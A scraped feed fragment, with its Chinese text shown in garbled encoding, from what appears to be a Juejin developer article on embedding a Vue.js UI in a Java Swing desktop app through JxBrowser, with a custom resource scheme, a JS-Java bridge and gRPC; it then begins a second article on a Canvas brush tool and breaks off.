<li>ä¸æ»‘çš„äº¤äº’ä½“éªŒï¼Œæ¥è¿‘ Web åº”ç”¨çš„æµç•…åº¦ã€‚</li>
<li>é€šè¿‡æ‰“åŒ…æ‰€æœ‰èµ„æºå®ç°ç¦»çº¿è¿è¡Œï¼Œå¯åŠ¨å³å¯ä½¿ç”¨ï¼Œæ— éœ€ç½‘ç»œè¿æ¥ã€‚</li>
</ul>
<p>åº”ç”¨å¯åŠ¨åä¼šæ˜¾ç¤ºä¸»æ§åˆ¶é¢æ¿ä»¥åŠåå¥½è®¾ç½®çª—å£ï¼Œç”¨æˆ·å¯ä»¥è°ƒæ•´ç•Œé¢ä¸»é¢˜ã€å­—ä½“å¤§å°ã€å¸ƒå±€ç­‰é€‰é¡¹ã€‚æ‰€æœ‰è®¾ç½®éƒ½ä¿å­˜åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨ä¸‹æ¬¡å¯åŠ¨æ—¶è‡ªåŠ¨æ¢å¤ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/744074cb0abd477ab27fd83c56fe4602~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGVhbURldg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767612662&amp;x-signature=CwRfsEGvZs%2FyNOFV7g1SN7bCzHg%3D" alt="åŸºäº Vue.js æ„å»º UI çš„æ¡Œé¢åº”ç”¨" loading="lazy"/></p>
<p align="center"><span>åŸºäº Vue.js æ„å»º UI çš„æ¡Œé¢åº”ç”¨</span></p>
<p>å®Œæ•´æºä»£ç å¯åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTeamDev-IP%2FJxBrowser-Gallery%2Ftree%2Fmaster%2Fdesktop-web-app%3Futm_source%3Djuejin%26utm_medium%3Darticle%26utm_campaign%3Ddesktop-app-with-vue-js" target="_blank" title="https://github.com/TeamDev-IP/JxBrowser-Gallery/tree/master/desktop-web-app?utm_source=juejin&amp;utm_medium=article&amp;utm_campaign=desktop-app-with-vue-js" ref="nofollow noopener noreferrer">GitHub</a> è·å–ã€‚</p>
<h2 data-id="heading-2">åº”ç”¨çª—å£ä¸ Web è§†å›¾</h2>
<p>åº”ç”¨ä¸»çª—å£åŸºäº Java Swing çš„ <code>JFrame</code>å®ç°ï¼Œä½œä¸º Java å†…ç½®ç»„ä»¶ï¼Œå®ƒå…·å¤‡è½»é‡æ˜“ç”¨çš„ç‰¹ç‚¹ã€‚çª—å£å†…éƒ¨åµŒå…¥äº† JxBrowser æä¾›çš„ Chromium å†…æ ¸ Web è§†å›¾ç»„ä»¶ï¼Œèƒ½å¤Ÿç›´æ¥åœ¨æ¡Œé¢çª—å£ä¸­æ¸²æŸ“ Vue.js ç•Œé¢ï¼Œå¹¶æ”¯æŒæ‰€æœ‰ç°ä»£æµè§ˆå™¨ç‰¹æ€§ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">var</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> Engine.newInstance(HARDWARE_ACCELERATED);
<span class="hljs-type">var</span> <span class="hljs-variable">browser</span> <span class="hljs-operator">=</span> engine.newBrowser();

SwingUtilities.invokeLater(() -&gt; {
    <span class="hljs-type">var</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> BrowserView.newInstance(browser);
    <span class="hljs-type">var</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">"Application"</span>);
    frame.addWindowListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowAdapter</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">windowClosing</span><span class="hljs-params">(WindowEvent e)</span> {
            engine.close();
        }
    });
    frame.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
    frame.add(view, BorderLayout.CENTER);
    frame.setSize(<span class="hljs-number">1280</span>, <span class="hljs-number">900</span>);
    frame.setLocationRelativeTo(<span class="hljs-literal">null</span>);
    frame.setVisible(<span class="hljs-literal">true</span>);
});
</code></pre>
<p>è¿™å¥—æ¶æ„åˆ†å·¥æ˜ç¡®ï¼šJava åç«¯è´Ÿè´£æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼ˆæ•°æ®è¯»å†™ã€æ–‡ä»¶æ“ä½œç­‰ï¼‰ï¼ŒVue.js å‰ç«¯ä¸“æ³¨äºç•Œé¢å¸ƒå±€ä¸ç”¨æˆ·äº¤äº’ï¼Œå„å¸å…¶èŒä¸”é«˜æ•ˆååŒã€‚</p>
<h2 data-id="heading-3">æ¡Œé¢åº”ç”¨ä¸­åŠ è½½ Web UI</h2>
<p>Vue.js éƒ¨åˆ†æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ ‡å‡† Web é¡¹ç›®ï¼Œæ ¹æ®ç¯å¢ƒçš„ä¸åŒï¼Œåº”ç”¨ä¼šä»æœ¬åœ°å¼€å‘æœåŠ¡å™¨æˆ–åµŒå…¥å¼é™æ€æ–‡ä»¶åŠ è½½å®ƒã€‚</p>
<h3 data-id="heading-4">å¼€å‘ç¯å¢ƒ</h3>
<p>å¼€å‘ç¯å¢ƒçš„ Web åº”ç”¨åŠ è½½æµç¨‹æä¸ºç®€æ´ï¼šå¯åŠ¨æœ¬åœ°å¼€å‘æœåŠ¡å™¨åï¼Œç›´æ¥è®¿é—® localhost åœ°å€å³å¯ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">./gradlew desktop-web-app:startDevServer -Pfrontend=vue
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">if</span> (!AppDetails.isProduction()) {  
   browser.navigation().loadUrl(<span class="hljs-string">"http://localhost"</span>);
} <span class="hljs-keyword">else</span> {
   ...
}
</code></pre>
<p>åº”ç”¨å¯åŠ¨åï¼ŒåµŒå…¥å¼ Web è§†å›¾ä¼šå¯¼èˆªè‡³æœ¬åœ°å¼€å‘æœåŠ¡å™¨åœ°å€ã€‚æ­¤æ—¶ä¿®æ”¹ Vue ç»„ä»¶æˆ–æ ·å¼ï¼Œæ— éœ€é‡æ–°æ„å»º Java éƒ¨åˆ†å³å¯å®æ—¶ç”Ÿæ•ˆã€‚</p>
<h3 data-id="heading-5">ç”Ÿäº§ç¯å¢ƒ</h3>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæ¡Œé¢åº”ç”¨éœ€è¦å®Œå…¨ç¦»çº¿è¿è¡Œã€‚ä¾èµ–æœ¬åœ° Web æœåŠ¡å™¨ä¸ä»…å¢åŠ å¤æ‚åº¦ï¼Œä¹Ÿå¸¦æ¥æ½œåœ¨å®‰å…¨é£é™©ã€‚</p>
<p>ä»æœ¬åœ°æˆ–è¿œç¨‹æœåŠ¡å™¨æä¾›ç”¨æˆ·ç•Œé¢ä¼šå¢åŠ é¢å¤–çš„å®‰å…¨é£é™©ï¼›ç”¨æˆ·å¯èƒ½ä¼šåœ¨æµè§ˆå™¨ä¸­åŠ è½½ Web åº”ç”¨ç¨‹åº URL å¹¶æ£€æŸ¥åº”ç”¨ç¨‹åºçš„æºä»£ç ï¼Œä»è€Œæš´éœ²æ•æ„Ÿé€»è¾‘ã€‚æˆ‘ä»¬å½“ç„¶ä¸å¸Œæœ›è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œæˆ‘ä»¬å¸Œæœ›ç”¨æˆ·ç•Œé¢åªèƒ½åœ¨æ¡Œé¢åº”ç”¨ç¨‹åºå†…éƒ¨è®¿é—®ï¼Œå¹¶ä¸”å…¶æºä»£ç éšè—åœ¨åº”ç”¨ç¨‹åºå†…éƒ¨ã€‚</p>
<p>ä¸ºå®ç°è¿™ä¸€ç›®æ ‡ï¼Œæˆ‘ä»¬å°† Web åº”ç”¨æ–‡ä»¶æ‰“åŒ…è‡³ Java èµ„æºç›®å½•ï¼Œé€šè¿‡ JxBrowser çš„è‡ªå®šä¹‰åè®®æ‹¦æˆª API ä»ç±»è·¯å¾„ä¸­ç›´æ¥åŠ è½½èµ„æºã€‚</p>
<p>é¦–å…ˆé…ç½®è‡ªå®šä¹‰åè®®ä¸è¯·æ±‚æ‹¦æˆªå™¨ï¼Œç”¨äºå¤„ç† Web èµ„æºè¯·æ±‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">var</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> EngineOptions.newBuilder(HARDWARE_ACCELERATED)
        .addScheme(Scheme.of(<span class="hljs-string">"jxb"</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlRequestInterceptor</span>());
<span class="hljs-type">var</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> Engine.newInstance(options.build());
</code></pre>
<p>Vue.js åº”ç”¨è¢«ç›´æ¥æ‰“åŒ…åˆ° Java èµ„æºä¸­ï¼Œé€šè¿‡ JxBrowser åŠ è½½ï¼Œä½¿ UI éƒ¨åˆ†å®Œå…¨ç‹¬ç«‹å°è£…ï¼š</p>
<ul>
<li>æ‰€æœ‰ HTMLã€CSSã€JavaScript æ–‡ä»¶å‡ä»åº”ç”¨ JAR åŒ…ä¸­è¯»å–</li>
<li>æ— éœ€ä¾èµ–ä»»ä½•å¤–éƒ¨æœåŠ¡å™¨</li>
<li>æºä»£ç ä¸ä¼šè¢«æµè§ˆå™¨å¼€å‘è€…å·¥å…·å®¡æŸ¥</li>
</ul>
<p>è¿™ç§æ–¹æ¡ˆç¡®ä¿äº†åº”ç”¨çš„é«˜æ€§èƒ½ã€å®‰å…¨æ€§ä¸å¯ç§»æ¤æ€§ï¼Œåœ¨ Windowsã€macOS å’Œ Linux ä¸‰å¤§æ“ä½œç³»ç»Ÿä¸Šå‡èƒ½ç¨³å®šè¿è¡Œã€‚</p>
<h2 data-id="heading-6">Vue.js ä¸ Java ä¹‹é—´çš„é€šä¿¡</h2>
<p>ä¸ºäº†å®ç°åº”ç”¨ç¨‹åºé€»è¾‘ï¼ŒVue.js å‰ç«¯éœ€è¦ä¸ Java åç«¯é€šä¿¡â€”â€”ä¾‹å¦‚ï¼Œè¯»å–æˆ–æ›´æ–°å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„åå¥½è®¾ç½®ã€‚</p>
<h3 data-id="heading-7">JxBrowser JavaScript - Java æ¡¥æ¥å™¨</h3>
<p>JxBrowser å†…ç½®äº† JavaScript ä¸ Java çš„ç›´æ¥é€šä¿¡æ¡¥ï¼Œå…è®¸ Web UI ç›´æ¥è°ƒç”¨ Java æ–¹æ³•ã€‚Vue.js å‰ç«¯å¯é€šè¿‡è¯¥æ¡¥è°ƒç”¨åç«¯æ¥å£ï¼ˆå¦‚ "ä¿å­˜ä¸»é¢˜è®¾ç½®"ï¼‰ï¼ŒJava åç«¯ä¹Ÿèƒ½ä¸»åŠ¨å‘å‰ç«¯å‘é€äº‹ä»¶æˆ–æ•°æ®æ›´æ–°ã€‚</p>
<p>ä»¥ä¸‹æ˜¯å¦‚ä½•åœ¨ JxBrowser ä¸­å£°æ˜ JavaScript å’Œ Java ä¹‹é—´é€šä¿¡çš„ç±»å‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@JsAccessible</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PrefsService</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFontSize</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span> {
    
    }
}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">declare</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrefsService</span> { 
    <span class="hljs-title function_">setFontSize</span>(<span class="hljs-attr">size</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span>; 
}

<span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">prefService</span>: <span class="hljs-title class_">PrefsService</span>;
...
prefsService.<span class="hljs-title function_">setFontSize</span>(<span class="hljs-number">12</span>);
</code></pre>
<h3 data-id="heading-8">Protobuf + gRPC</h3>
<p>å¯¹äºç®€å•äº¤äº’ï¼Œåº”ç”¨ä»å¯ä½¿ç”¨ç°æœ‰ REST æ¥å£ï¼›è€Œé’ˆå¯¹æ›´å¤æ‚ã€éœ€è¦å¯æ‰©å±•æ€§çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å¼•å…¥äº† Protocol Buffersï¼ˆProtobufï¼‰ä¸ gRPCï¼Œæ„å»ºäº†æ›´å¿«é€Ÿã€ç±»å‹å®‰å…¨çš„é€šä¿¡å±‚ã€‚</p>
<p>é€šè¿‡ Protobuf ç»Ÿä¸€å®šä¹‰æ•°æ®ç»“æ„ä¸æœåŠ¡ APIï¼Œå¯è‡ªåŠ¨ä¸ºå‰åç«¯ç”Ÿæˆå¼ºç±»å‹å®¢æˆ·ç«¯ / æœåŠ¡å™¨ä»£ç ã€‚åªéœ€åœ¨ <code>.proto</code> æ–‡ä»¶ä¸­å®šä¹‰æ¶ˆæ¯æ ¼å¼ä¸æœåŠ¡æ¥å£ï¼ŒProtobuf ä¾¿ä¼šè‡ªåŠ¨ç”Ÿæˆ Java ä¸ TypeScript ä»£ç ã€‚</p>
<pre><code class="hljs language-proto" lang="proto">service PrefsService {
  rpc SetFontSize(FontSize) returns (google.protobuf.Empty);
}

enum FontSize {
  SMALL = 0;
  DEFAULT = 1;
  LARGE = 2;
}
</code></pre>
<p>gRPC ä½œä¸ºä¼ è¾“å±‚ï¼šJava åç«¯è¿è¡Œè½»é‡çº§ gRPC æœåŠ¡å™¨ï¼ŒVue.js åº”ç”¨ä»¥å®¢æˆ·ç«¯èº«ä»½ä¸ä¹‹é€šä¿¡ï¼Œå®ç°ç»“æ„åŒ–æ•°æ®çš„å®‰å…¨é«˜æ•ˆä¼ è¾“ã€‚</p>
<p>è¯¥æ–¹æ¡ˆå¸¦æ¥äº†ä¸‰å¤§ä¼˜åŠ¿ï¼š</p>
<ul>
<li>åœ¨åº”ç”¨å‰åç«¯ä¹‹é—´å®ç°ç±»å‹å®‰å…¨ã€‚</li>
<li>åœ¨æ„å»ºé˜¶æ®µè·å¾—è‡ªåŠ¨è¡¥å…¨ä¸é”™è¯¯æ£€æŸ¥èƒ½åŠ›ã€‚</li>
<li>å½“åŠŸèƒ½æˆ– API å¢åŠ æ—¶ï¼Œç³»ç»Ÿèƒ½å¤Ÿæ›´å®¹æ˜“æ‰©å±•ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1256fb4b7b384b75810713b9d324085f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGVhbURldg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767612662&amp;x-signature=P4MGVciDm9r5Km2DGb0EdVBqckA%3D" alt="é€šä¿¡å›¾" loading="lazy"/></p>
<p align="center"><span>é€šä¿¡å›¾</span></p>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>é‡‡ç”¨ Web UI æ„å»ºæ¡Œé¢åº”ç”¨å·²è¢«è¯æ˜æ˜¯ä¸€ç§å¼ºå¤§çš„ç°ä»£å¼€å‘æ¨¡å¼ã€‚å®ƒæ—¢ä¿ç•™äº† Web æŠ€æœ¯çš„æ˜“ç”¨æ€§ä¸ç”Ÿæ€ä¼˜åŠ¿ï¼Œåˆå…·å¤‡åŸç”Ÿæ¡Œé¢åº”ç”¨çš„ç³»ç»Ÿé›†æˆèƒ½åŠ›ä¸æ€§èƒ½è¡¨ç°ã€‚</p>
<p>æœ¬æ–‡å®ç°çš„ Java æ¡Œé¢åº”ç”¨ï¼Œé€šè¿‡ Vue.js æ„å»ºå‰ç«¯ç•Œé¢ã€Tailwind CSS å¤„ç†æ ·å¼ï¼Œæ ¸å¿ƒè¾¾æˆäº†ä»¥ä¸‹ç›®æ ‡ï¼š</p>
<ul>
<li>å°† Chromium å†…æ ¸ Web è§†å›¾åµŒå…¥ Java çª—å£ã€‚</li>
<li>å®ç°å¼€å‘ / ç”Ÿäº§ç¯å¢ƒä¸‹çš„ Vue èµ„æºæ— ç¼åŠ è½½ã€‚</li>
<li>ä½¿ç”¨ gRPC å’Œ Protobuf å®ç° Web UI ä¸ Java åç«¯ä¹‹é—´çš„é€šä¿¡ã€‚</li>
</ul>
<p>è¿™ç§æ··åˆæ¶æ„ç»“åˆäº† Java å’Œ Vue.js å‰ç«¯ï¼Œå…è®¸å¼€å‘è€…åœ¨æ¡Œé¢ç¯å¢ƒä¸­ä½¿ç”¨æ ‡å‡†çš„ Web å·¥å…·ï¼Œå¹¶ä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿä½œä¸ºç‹¬ç«‹çš„è½¯ä»¶åŒ…è¿è¡Œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»ç‚¹åˆ°çº¿ï¼Œä»çº¿åˆ°ç”»ï¼šCanvas ç”»ç¬”å·¥å…·çš„å®ç°è‰ºæœ¯]]></title>    <link>https://juejin.cn/post/7589074117644927011</link>    <guid>https://juejin.cn/post/7589074117644927011</guid>    <pubDate>2025-12-29T13:50:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644927011" data-draft-id="7589104492883116084" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»ç‚¹åˆ°çº¿ï¼Œä»çº¿åˆ°ç”»ï¼šCanvas ç”»ç¬”å·¥å…·çš„å®ç°è‰ºæœ¯"/> <meta itemprop="keywords" content="å‰ç«¯,Electron"/> <meta itemprop="datePublished" content="2025-12-29T13:50:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¾™å›½æµªå­"/> <meta itemprop="url" content="https://juejin.cn/user/1943592291275886"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»ç‚¹åˆ°çº¿ï¼Œä»çº¿åˆ°ç”»ï¼šCanvas ç”»ç¬”å·¥å…·çš„å®ç°è‰ºæœ¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1943592291275886/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¾™å›½æµªå­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:50:52.000Z" title="Mon Dec 29 2025 13:50:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">âœï¸ ä»ç‚¹åˆ°çº¿ï¼Œä»çº¿åˆ°ç”»ï¼šCanvas ç”»ç¬”å·¥å…·çš„å®ç°è‰ºæœ¯</h2>
<blockquote>
<p>ğŸ’¡ ç”»ç¬”å·¥å…·æ˜¯åœ°å›¾è®¾è®¡ä¸­æœ€åŸºç¡€ä¹Ÿæœ€é‡è¦çš„å·¥å…·ä¹‹ä¸€ã€‚æœ¬æ–‡å°†å¸¦ä½ æ¢ç´¢ 51mazi é¡¹ç›®ä¸­ç”»ç¬”å·¥å…·çš„å®ç°æ€è·¯ï¼Œä»ç‚¹åæ ‡æ”¶é›†åˆ°å¹³æ»‘æ›²çº¿ç”Ÿæˆï¼Œä» perfect-freehand ç®—æ³•åˆ°å®æ—¶æ¸²æŸ“ä¼˜åŒ–ï¼Œæ­ç§˜å¦‚ä½•æ‰“é€ ä¸€ä¸ªæµç•…è‡ªç„¶çš„ç”»ç¬”ä½“éªŒã€‚</p>
</blockquote>
<h3 data-id="heading-1">ğŸ“‹ ç›®å½•</h3>
<ul>
<li><a href="#%E5%8A%9F%E8%83%BD%E7%AE%80%E4%BB%8B" title="#%E5%8A%9F%E8%83%BD%E7%AE%80%E4%BB%8B">åŠŸèƒ½ç®€ä»‹</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95perfect-freehand" title="#%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95perfect-freehand">æ ¸å¿ƒç®—æ³•ï¼šperfect-freehand</a></li>
<li><a href="#%E6%8A%80%E6%9C%AF%E6%8C%91%E6%88%98" title="#%E6%8A%80%E6%9C%AF%E6%8C%91%E6%88%98">æŠ€æœ¯æŒ‘æˆ˜</a></li>
<li><a href="#%E5%AE%9E%E7%8E%B0%E4%BA%AE%E7%82%B9" title="#%E5%AE%9E%E7%8E%B0%E4%BA%AE%E7%82%B9">å®ç°äº®ç‚¹</a></li>
<li><a href="#%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96" title="#%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96">æ€§èƒ½ä¼˜åŒ–</a></li>
<li><a href="#%E6%80%BB%E7%BB%93" title="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li>
</ul>
<h3 data-id="heading-2">ğŸ¯ åŠŸèƒ½ç®€ä»‹</h3>
<p>ç”»ç¬”å·¥å…·æ˜¯åœ°å›¾è®¾è®¡å·¥å…·ä¸­çš„"æ‰‹ç»˜ç¥å™¨"ï¼Œè®©ç”¨æˆ·å¯ä»¥åƒåœ¨çº¸ä¸Šç”»ç”»ä¸€æ ·è‡ªç”±ç»˜åˆ¶ã€‚åœ¨ 51mazi çš„åœ°å›¾è®¾è®¡å·¥å…·ä¸­ï¼Œç”»ç¬”å·¥å…·ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç®€å•çš„çº¿æ¡ç»˜åˆ¶åŠŸèƒ½ï¼Œè€Œæ˜¯ä¸€ä¸ªé›†æˆäº†å¹³æ»‘ç®—æ³•ã€å®æ—¶æ¸²æŸ“ã€å‚æ•°æ§åˆ¶ç­‰å¤šé¡¹æŠ€æœ¯çš„å®Œæ•´è§£å†³æ–¹æ¡ˆã€‚</p>
<h4 data-id="heading-3">âœï¸ åŠŸèƒ½ç‰¹æ€§</h4>
<ul>
<li>âœ… <strong>å¹³æ»‘ç»˜åˆ¶</strong>: åŸºäº perfect-freehand ç®—æ³•ï¼Œç”Ÿæˆè‡ªç„¶æµç•…çš„ç”»ç¬”æ•ˆæœ</li>
<li>âœ… <strong>å®æ—¶é¢„è§ˆ</strong>: ç»˜åˆ¶è¿‡ç¨‹ä¸­å®æ—¶æ˜¾ç¤ºç”»ç¬”è½¨è¿¹ï¼Œä½“éªŒæµç•…</li>
<li>âœ… <strong>å‚æ•°æ§åˆ¶</strong>: æ”¯æŒé¢œè‰²ã€å¤§å°ã€é€æ˜åº¦ç­‰å‚æ•°è‡ªå®šä¹‰</li>
<li>âœ… <strong>å‹åŠ›æ¨¡æ‹Ÿ</strong>: æ¨¡æ‹ŸçœŸå®ç”»ç¬”çš„å‹åŠ›å˜åŒ–ï¼Œè®©çº¿æ¡æ›´è‡ªç„¶</li>
<li>âœ… <strong>å®Œæ•´å†å²è®°å½•</strong>: æ”¯æŒæ’¤é”€/é‡åšï¼Œæ“ä½œå¯è¿½æº¯</li>
</ul>
<h4 data-id="heading-4">ğŸ–¼ï¸ ä½¿ç”¨åœºæ™¯</h4>
<p>åœ¨åœ°å›¾è®¾è®¡ä¸­ï¼Œç”»ç¬”å·¥å…·å¸¸ç”¨äºï¼š</p>
<ul>
<li>ğŸ—ºï¸ ç»˜åˆ¶åœ°å½¢è½®å»“ï¼ˆå±±è„‰ã€æ²³æµã€æµ·å²¸çº¿ç­‰ï¼‰</li>
